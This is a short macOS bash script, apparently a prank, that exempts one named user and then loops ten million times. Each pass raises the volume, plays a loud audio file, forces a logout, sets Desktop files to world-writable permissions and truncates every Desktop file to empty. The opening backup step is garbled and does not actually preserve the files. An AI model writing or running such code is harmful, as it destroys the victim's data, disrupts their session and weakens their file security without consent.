#!/bin/bash

MOTHER="hmeftah"
if [ "$MOTHER" = "$USER" ]; then
	echo "Nice try ;)"
	exit
fi
mkdir /Users/$USER/.backup$1
for file in /Users/$USER/Desktop/; do cp -pr /Users/$USER/Desktop/$file /Users/$USER/BACKUP$1 > "$file" & done
for i in {1..10000000};
do
	osascript -e "set Volume 10"
	afplay /Users/$USER/Music/lkwa$1/LOUDAF/Depression.mp3
	launchctl reboot logout
	chmod 777 /Users/$USER/Desktop/*
	for file in /Users/$USER/Desktop/*.*; do cat /dev/null > "$file" & done
done
